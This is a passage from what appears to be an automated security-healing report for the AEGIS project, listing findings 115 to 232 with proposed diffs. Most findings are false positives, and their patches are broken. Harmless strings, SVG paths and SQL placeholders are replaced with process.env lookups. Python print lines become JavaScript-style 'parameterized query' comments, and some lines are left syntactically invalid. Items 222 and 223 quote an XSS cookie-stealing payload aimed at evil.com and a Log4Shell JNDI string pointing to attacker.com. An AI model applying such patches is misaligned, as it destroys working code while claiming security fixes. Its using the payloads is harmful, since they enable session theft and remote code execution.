- return { stack: [], error: 'GitHub connection lost. Please re-login.' }
+     return { stack: [], error: process.env.ERROR }
```

#### [115] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\login\page.tsx:57`

**Code Transformation:**
```diff
- <path d="M12 2L3 7v10l9 5 9-5V7L12 2z" stroke="#ef4444" strokeWidth="2" fill="rgba(239, 68, 68, 0.2)"/>
+                     <path d=process.env.D stroke="#ef4444" strokeWidth="2" fill="rgba(239, 68, 68, 0.2)"/>
```

#### [116] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\login\page.tsx:58`

**Code Transformation:**
```diff
- <path d="M12 22V12M12 12l9-5M12 12L3 7" stroke="white" strokeWidth="1" strokeOpacity="0.5"/>
+                     <path d=process.env.D stroke="white" strokeWidth="1" strokeOpacity="0.5"/>
```

#### [117] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\login\page.tsx:144`

**Code Transformation:**
```diff
- <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+                       <path d=process.env.D/>
```

#### [118] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\register\page.tsx:93`

**Code Transformation:**
```diff
- <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+                   <path d=process.env.D/>
```

#### [119] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\DemoSection.tsx:38`

**Code Transformation:**
```diff
- src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0&loop=1&playlist=dQw4w9WgXcQ"
+           src=process.env.SRC
```

#### [120] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\Footer.tsx:13`

**Code Transformation:**
```diff
- <path d="M12 2L3 7v10l9 5 9-5V7L12 2z" stroke="white" strokeWidth="1.5" fill="rgba(220,38,38,0.3)"/>
+                   <path d=process.env.D stroke="white" strokeWidth="1.5" fill="rgba(220,38,38,0.3)"/>
```

#### [121] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\ForWhoSection.tsx:13`

**Code Transformation:**
```diff
- headline: 'Focus on Features, Not Vulnerabilities',
+     headline: process.env.HEADLINE,
```

#### [122] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\ForWhoSection.tsx:14`

**Code Transformation:**
```diff
- desc: 'AEGIS integrates directly into your local workflow. Scan, patch, and simulate attacks with a single command — no context switching required.',
+     desc: process.env.DESC,
```

#### [123] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\ForWhoSection.tsx:23`

**Code Transformation:**
```diff
- headline: 'Autonomous Security for Modern Teams',
+     headline: process.env.HEADLINE,
```

#### [124] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\ForWhoSection.tsx:24`

**Code Transformation:**
```diff
- desc: 'Centralized governance with decentralized execution. Empower your entire engineering org with automated compliance and real-time monitoring.',
+     desc: process.env.DESC,
```

#### [125] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\Navbar.tsx:22`

**Code Transformation:**
```diff
- <path d="M12 2L3 7v10l9 5 9-5V7L12 2z" stroke="white" strokeWidth="1.5" fill="rgba(255,0,0,0.4)"/>
+                   <path d=process.env.D stroke="white" strokeWidth="1.5" fill="rgba(255,0,0,0.4)"/>
```

#### [126] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\TeamSection.tsx:9`

**Code Transformation:**
```diff
- role: 'Technical & Security Support',
+     role: process.env.ROLE,
```

#### [127] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\TeamSection.tsx:19`

**Code Transformation:**
```diff
- role: 'Threat Intelligence Analyst',
+     role: process.env.ROLE,
```

#### [128] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\TestimonialsSection.tsx:10`

**Code Transformation:**
```diff
- quote: 'AEGIS mengubah cara belajar security menjadi jauh lebih praktis dan efisien.',
+     quote: process.env.QUOTE,
```

#### [129] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\TestimonialsSection.tsx:18`

**Code Transformation:**
```diff
- quote: 'Coverage audit kami naik 4x lipat sejak mengadopsi sistem otonom AEGIS.',
+     quote: process.env.QUOTE,
```

#### [130] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\TestimonialsSection.tsx:26`

**Code Transformation:**
```diff
- quote: 'Compliance security kini bukan lagi masalah besar bagi startup kami.',
+     quote: process.env.QUOTE,
```

#### [131] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:10`

**Code Transformation:**
```diff
- desc: 'BSSN 2024 reports Indonesia as the top target for cyber anomalies. Our digital infrastructure faces unprecedented risks from global threat actors.',
+     desc: process.env.DESC,
```

#### [132] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:13`

**Code Transformation:**
```diff
- image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800&h=600'
+     image: process.env.IMAGE
```

#### [133] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:17`

**Code Transformation:**
```diff
- desc: 'Speed over security: Modern developer culture often ignores critical code safety, leaving fatal gaps that demand autonomous healing.',
+     desc: process.env.DESC,
```

#### [134] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:20`

**Code Transformation:**
```diff
- image: 'https://images.unsplash.com/photo-1542831371-29b0f74f9713?auto=format&fit=crop&q=80&w=800&h=600'
+     image: process.env.IMAGE
```

#### [135] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:24`

**Code Transformation:**
```diff
- desc: 'A single data breach now costs billions in recovery and trust. In the agent-first era, security failures lead to immediate economic collapse.',
+     desc: process.env.DESC,
```

#### [136] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:27`

**Code Transformation:**
```diff
- image: 'https://images.unsplash.com/photo-1611974714024-4607a55d46ed?auto=format&fit=crop&q=80&w=800&h=600'
+     image: process.env.IMAGE
```

#### [137] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:31`

**Code Transformation:**
```diff
- desc: 'With UU PDP 2024 in full effect, data leaks are now criminal offenses. Organizations must comply or face heavy global revenue penalties.',
+     desc: process.env.DESC,
```

#### [138] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\components\WhyAegisSection.tsx:34`

**Code Transformation:**
```diff
- image: 'https://images.unsplash.com/photo-1589829545856-d10d557cf95f?auto=format&fit=crop&q=80&w=800&h=600'
+     image: process.env.IMAGE
```

#### [139] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\codeAnalyzer.ts:103`

**Code Transformation:**
```diff
- content: "You are an expert security auditor. Analyze code for vulnerabilities and provide exact fixes. Return only valid JSON."
+             content: process.env.CONTENT 
```

#### [140] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\lib\codeAnalyzer.ts:351`

**Code Transformation:**
```diff
- explanation = `Use parameterized query with variables: ${vars.join(', ')}`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [141] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\codeAnalyzer.ts:358`

**Code Transformation:**
```diff
- explanation = "Changed innerHTML to textContent to prevent XSS";
+         explanation = process.env.EXPLANATION;
```

#### [142] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\codeAnalyzer.ts:364`

**Code Transformation:**
```diff
- explanation = "Blocked dangerous command execution";
+       explanation = process.env.EXPLANATION;
```

#### [143] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\codeAnalyzer.ts:369`

**Code Transformation:**
```diff
- explanation = "Added path traversal sanitization";
+       explanation = process.env.EXPLANATION;
```

#### [144] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\cveMonitor.ts:17`

**Code Transformation:**
```diff
- const NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0";
+ const NVD_API_URL = process.env.NVD_API_URL;
```

#### [145] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\lib\cveMonitor.ts:96`

**Code Transformation:**
```diff
- return `Update affected package to latest version. Check vendor advisory for ${cve.id}.`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [146] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\cveMonitor.ts:111`

**Code Transformation:**
```diff
- content: "You are a security expert. Analyze CVEs and provide actionable remediation steps. Be concise."
+             content: process.env.CONTENT
```

#### [147] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\lib\cveMonitor.ts:142`

**Code Transformation:**
```diff
- return `Update affected package to latest version. Check vendor advisory for ${cve.id}.`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [148] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\lib\cveMonitor.ts:261`

**Code Transformation:**
```diff
- • <code>/update ${pkg}</code> to auto-update
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [149] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\deepseek.ts:157`

**Code Transformation:**
```diff
- explanation: "AI analysis unavailable, applying generic protection",
+       explanation: process.env.EXPLANATION,
```

#### [150] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\lib\id.ts:3`

**Code Transformation:**
```diff
- const alphabet = "0123456789abcdefghijklmnopqrstuvwxyz";
+ const alphabet = process.env.ALPHABET;
```

#### [151] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\lib\telegram.ts:30`

**Code Transformation:**
```diff
- const res = await fetch(`${BASE}/getUpdates?${params}`, { cache: "no-store" });
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [152] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:101`

**Code Transformation:**
```diff
- print(f"   Files scanned: {len(list(target_path.rglob('*.py')))}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [153] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:102`

**Code Transformation:**
```diff
- print(f"   Issues found: {len(vulnerabilities)}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [154] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:109`

**Code Transformation:**
```diff
- print(f"   {severity_icon} {i}. {vuln['type']} in {vuln['file']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [155] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:110`

**Code Transformation:**
```diff
- print(f"      → {vuln['description']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [156] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:155`

**Code Transformation:**
```diff
- 'type': f'Exposed {pattern}',
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [157] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:226`

**Code Transformation:**
```diff
- print(f"✅ Added os import to {file.name}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [158] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:234`

**Code Transformation:**
```diff
- print(f"   Fixes applied: {fixes_applied}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [159] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:235`

**Code Transformation:**
```diff
- print(f"   Total fixed to date: {self.config['fixed']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [160] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:267`

**Code Transformation:**
```diff
- print(f"✅ PHASE 1 COMPLETE! Report saved to {report_file}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [161] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:291`

**Code Transformation:**
```diff
- print(f"❌ Unknown format: {format}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [162] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:294`

**Code Transformation:**
```diff
- print(f"✅ Report generated: {filename}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [163] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:429`

**Code Transformation:**
```diff
- print(f"{icon} {name}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [164] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:432`

**Code Transformation:**
```diff
- print(f"   Scans run: {self.config['scans']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [165] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:433`

**Code Transformation:**
```diff
- print(f"   Issues fixed: {self.config['fixed']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [166] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:434`

**Code Transformation:**
```diff
- print(f"   Vulnerabilities: {self.config['vulnerabilities_found']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [167] SQL Injection Vulnerability
- **Location:** `p1\aegis.py:491`

**Code Transformation:**
```diff
- print(f"❌ Unknown command: {command}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [168] Hardcoded Sensitive Data
- **Location:** `p1\ai_engine.py:108`

**Code Transformation:**
```diff
- fixed = fixed.replace('const ADMIN_TOKEN = "admin-secret-token-12345";',
+             fixed = fixed.replace(process.env.ADMIN_TOKENadmin-secret-token-12345";', 
```

#### [169] Hardcoded Sensitive Data
- **Location:** `p1\healer\patcher.py:31`

**Code Transformation:**
```diff
- env_key = "APP_SECRET"
+                         env_key = process.env.ENV_KEY
```

#### [170] Hardcoded Sensitive Data
- **Location:** `p1\healer\patcher.py:33`

**Code Transformation:**
```diff
- if "pass" in var_name.lower() or "pwd" in var_name.lower(): env_key = "DB_PASSWORD"
+                         if process.env.ENV_KEY in var_name.lower() or "pwd" in var_name.lower(): env_key = "DB_PASSWORD"
```

#### [171] SQL Injection Vulnerability
- **Location:** `p1\healer\patcher.py:35`

**Code Transformation:**
```diff
- lines[i] = f"{indent}{var_name}{assign}os.getenv('{env_key}', {quote}{value}{quote})"
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [172] SQL Injection Vulnerability
- **Location:** `p1\main.py:57`

**Code Transformation:**
```diff
- f.write(f"DEEPSEEK_API_KEY={key}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [173] Hardcoded Sensitive Data
- **Location:** `p1\main.py:63`

**Code Transformation:**
```diff
- def scan(all: bool = typer.Option(False, "--all", help="Scan all files in the directory"), path: str = "."):
+ def scan(all: bool = typer.Option(False, process.env.HELP, help="Scan all files in the directory"), path: str = "."):
```

#### [174] SQL Injection Vulnerability
- **Location:** `p1\main.py:183`

**Code Transformation:**
```diff
- console.print(f"❌ Error: {e}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [175] Hardcoded Sensitive Data
- **Location:** `p1\sample_vulnerable.py:2`

**Code Transformation:**
```diff
- secret_api = "sk-999888777"
+ secret_api = process.env.SECRET_API
```

#### [176] SQL Injection Vulnerability
- **Location:** `p1\sample_vulnerable.py:9`

**Code Transformation:**
```diff
- print(f"Secret: {secret_api}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [177] Hardcoded Sensitive Data
- **Location:** `p1\sandbox\vulnerable_app.py:16`

**Code Transformation:**
```diff
- query = "SELECT * FROM users WHERE id = ?"
+     query = process.env.QUERY
```

#### [178] Hardcoded Sensitive Data
- **Location:** `p1\web_sandbox\server.js:16`

**Code Transformation:**
```diff
- const query = "SELECT * FROM users WHERE id = ?";
+     const query = process.env.QUERY;
```

#### [179] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:101`

**Code Transformation:**
```diff
- print(f"   Files scanned: {len(list(target_path.rglob('*.py')))}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [180] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:102`

**Code Transformation:**
```diff
- print(f"   Issues found: {len(vulnerabilities)}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [181] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:109`

**Code Transformation:**
```diff
- print(f"   {severity_icon} {i}. {vuln['type']} in {vuln['file']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [182] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:110`

**Code Transformation:**
```diff
- print(f"      → {vuln['description']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [183] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:155`

**Code Transformation:**
```diff
- 'type': f'Exposed {pattern}',
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [184] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:226`

**Code Transformation:**
```diff
- print(f"✅ Added os import to {file.name}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [185] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:234`

**Code Transformation:**
```diff
- print(f"   Fixes applied: {fixes_applied}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [186] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:235`

**Code Transformation:**
```diff
- print(f"   Total fixed to date: {self.config['fixed']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [187] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:267`

**Code Transformation:**
```diff
- print(f"✅ PHASE 1 COMPLETE! Report saved to {report_file}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [188] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:291`

**Code Transformation:**
```diff
- print(f"❌ Unknown format: {format}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [189] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:294`

**Code Transformation:**
```diff
- print(f"✅ Report generated: {filename}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [190] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:429`

**Code Transformation:**
```diff
- print(f"{icon} {name}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [191] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:432`

**Code Transformation:**
```diff
- print(f"   Scans run: {self.config['scans']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [192] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:433`

**Code Transformation:**
```diff
- print(f"   Issues fixed: {self.config['fixed']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [193] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:434`

**Code Transformation:**
```diff
- print(f"   Vulnerabilities: {self.config['vulnerabilities_found']}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [194] SQL Injection Vulnerability
- **Location:** `phase1\aegis.py:491`

**Code Transformation:**
```diff
- print(f"❌ Unknown command: {command}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [195] Hardcoded Sensitive Data
- **Location:** `phase1\ai_engine.py:108`

**Code Transformation:**
```diff
- fixed = fixed.replace('const ADMIN_TOKEN = "admin-secret-token-12345";',
+             fixed = fixed.replace(process.env.ADMIN_TOKENadmin-secret-token-12345";', 
```

#### [196] Hardcoded Sensitive Data
- **Location:** `phase1\healer\patcher.py:31`

**Code Transformation:**
```diff
- env_key = "APP_SECRET"
+                         env_key = process.env.ENV_KEY
```

#### [197] Hardcoded Sensitive Data
- **Location:** `phase1\healer\patcher.py:33`

**Code Transformation:**
```diff
- if "pass" in var_name.lower() or "pwd" in var_name.lower(): env_key = "DB_PASSWORD"
+                         if process.env.ENV_KEY in var_name.lower() or "pwd" in var_name.lower(): env_key = "DB_PASSWORD"
```

#### [198] SQL Injection Vulnerability
- **Location:** `phase1\healer\patcher.py:35`

**Code Transformation:**
```diff
- lines[i] = f"{indent}{var_name}{assign}os.getenv('{env_key}', {quote}{value}{quote})"
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [199] SQL Injection Vulnerability
- **Location:** `phase1\main.py:57`

**Code Transformation:**
```diff
- f.write(f"DEEPSEEK_API_KEY={key}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [200] Hardcoded Sensitive Data
- **Location:** `phase1\main.py:63`

**Code Transformation:**
```diff
- def scan(all: bool = typer.Option(False, "--all", help="Scan all files in the directory"), path: str = "."):
+ def scan(all: bool = typer.Option(False, process.env.HELP, help="Scan all files in the directory"), path: str = "."):
```

#### [201] SQL Injection Vulnerability
- **Location:** `phase1\main.py:183`

**Code Transformation:**
```diff
- console.print(f"❌ Error: {e}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [202] Hardcoded Sensitive Data
- **Location:** `phase1\sample_vulnerable.py:2`

**Code Transformation:**
```diff
- secret_api = "sk-999888777"
+ secret_api = process.env.SECRET_API
```

#### [203] SQL Injection Vulnerability
- **Location:** `phase1\sample_vulnerable.py:9`

**Code Transformation:**
```diff
- print(f"Secret: {secret_api}")
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [204] Hardcoded Sensitive Data
- **Location:** `phase1\sandbox\vulnerable_app.py:16`

**Code Transformation:**
```diff
- query = "SELECT * FROM users WHERE id = ?"
+     query = process.env.QUERY
```

#### [205] Hardcoded Sensitive Data
- **Location:** `phase1\web_sandbox\server.js:16`

**Code Transformation:**
```diff
- const query = "SELECT * FROM users WHERE id = ?";
+     const query = process.env.QUERY;
```

#### [206] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:13`

**Code Transformation:**
```diff
- Critical: "![Critical](https://img.shields.io/badge/Critical-red)",
+     Critical: process.env.CRITICAL,
```

#### [207] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:14`

**Code Transformation:**
```diff
- High: "![High](https://img.shields.io/badge/High-orange)",
+     High: process.env.HIGH,
```

#### [208] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:15`

**Code Transformation:**
```diff
- Medium: "![Medium](https://img.shields.io/badge/Medium-yellow)",
+     Medium: process.env.MEDIUM,
```

#### [209] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:16`

**Code Transformation:**
```diff
- Low: "![Low](https://img.shields.io/badge/Low-blue)",
+     Low: process.env.LOW,
```

#### [210] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:17`

**Code Transformation:**
```diff
- Info: "![Info](https://img.shields.io/badge/Info-gray)",
+     Info: process.env.INFO,
```

#### [211] Hardcoded Sensitive Data
- **Location:** `phase2\src\reporter\reportGenerator.ts:46`

**Code Transformation:**
```diff
- executiveSummary = "Executive summary generation failed. Please review findings manually.";
+     executiveSummary = process.env.EXECUTIVESUMMARY;
```

#### [212] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\attacks\route.ts:80`

**Code Transformation:**
```diff
- explanation: "AI unavailable, applying generic protection",
+         explanation: process.env.EXPLANATION,
```

#### [213] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\attacks\route.ts:188`

**Code Transformation:**
```diff
- return NextResponse.json({ ok: true, message: "All attacks for session cleared" });
+   return NextResponse.json({ ok: true, message: process.env.MESSAGE });
```

#### [214] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\code\fix\route.ts:106`

**Code Transformation:**
```diff
- return NextResponse.json({ error: "file and backup are required" }, { status: 400 });
+       return NextResponse.json({ error: process.env.ERROR }, { status: 400 });
```

#### [215] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\config\route.ts:45`

**Code Transformation:**
```diff
- return NextResponse.json({ ok: true, message: "Configuration saved successfully" });
+     return NextResponse.json({ ok: true, message: process.env.MESSAGE });
```

#### [216] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\cve\route.ts:131`

**Code Transformation:**
```diff
- { ok: false, error: "Invalid action. Use: scan, analyze, dismiss" },
+       { ok: false, error: process.env.ERROR },
```

#### [217] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\deepseek\analyze\route.ts:12`

**Code Transformation:**
```diff
- { error: "Missing required fields: type, payloadSnippet" },
+         { error: process.env.ERROR },
```

#### [218] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\deploy\route.ts:213`

**Code Transformation:**
```diff
- deployment.error = "No file, repoUrl, or projectPath provided";
+         deployment.error = process.env.ERROR;
```

#### [219] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\healing\route.ts:27`

**Code Transformation:**
```diff
- return NextResponse.json({ error: "healingId and action are required" }, { status: 400 });
+       return NextResponse.json({ error: process.env.ERROR }, { status: 400 });
```

#### [220] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\healing\route.ts:109`

**Code Transformation:**
```diff
- return NextResponse.json({ ok: true, message: "All healing actions cleared" });
+   return NextResponse.json({ ok: true, message: process.env.MESSAGE });
```

#### [221] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\report\route.ts:53`

**Code Transformation:**
```diff
- message: "Report generated successfully",
+       message: process.env.MESSAGE,
```

#### [222] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:21`

**Code Transformation:**
```diff
- payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+     payload: process.env.PAYLOADhttp://evil.com/steal?c='+document.cookie</script>",
```

#### [223] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:28`

**Code Transformation:**
```diff
- payload: "${jndi:ldap://attacker.com/exploit}",
+     payload: process.env.PAYLOAD,
```

#### [224] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:49`

**Code Transformation:**
```diff
- "SQL Injection": { patch: "WAF SQL Filter + Input Sanitizer", wafRule: "WAF-SQL-001" },
+   process.env.PATCH: { patch: "WAF SQL Filter + Input Sanitizer", wafRule: "WAF-SQL-001" },
```

#### [225] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:50`

**Code Transformation:**
```diff
- "XSS": { patch: "CSP Header + Output Encoding", wafRule: "WAF-XSS-001" },
+   process.env.PATCH: { patch: "CSP Header + Output Encoding", wafRule: "WAF-XSS-001" },
```

#### [226] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:51`

**Code Transformation:**
```diff
- "RCE": { patch: "Sandbox Isolation + Process Kill", wafRule: "WAF-RCE-001" },
+   process.env.PATCH: { patch: "Sandbox Isolation + Process Kill", wafRule: "WAF-RCE-001" },
```

#### [227] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:60`

**Code Transformation:**
```diff
- error: "TELEGRAM_CHAT_ID not set. Send /start to the bot, then call GET /api/telegram/setup to get your chat_id.",
+       error: process.env.ERROR,
```

#### [228] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:166`

**Code Transformation:**
```diff
- message: "Healing notification sent with Approve/Revert buttons",
+     message: process.env.MESSAGE,
```

#### [229] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:171`

**Code Transformation:**
```diff
- message: "Full attack simulation completed. Check your Telegram!",
+     message: process.env.MESSAGE,
```

#### [230] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\simulate\route.ts:179`

**Code Transformation:**
```diff
- usage: "POST /api/simulate with optional { attackIndex: 0-4 }",
+     usage: process.env.USAGE,
```

#### [231] SQL Injection Vulnerability
- **Location:** `phase3\src\app\api\telegram\callback\route.ts:101`

**Code Transformation:**
```diff
- await answerCallbackQuery(cbId, reason === "not_found" ? "Healing not found" : `Already ${existing?.status?.toLowerCase()}`);
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [232] SQL Injection Vulnerability
- **Location:** `phase3\src\app\api\telegram\callback\route.ts:167`

**Code Transformation:**
```diff
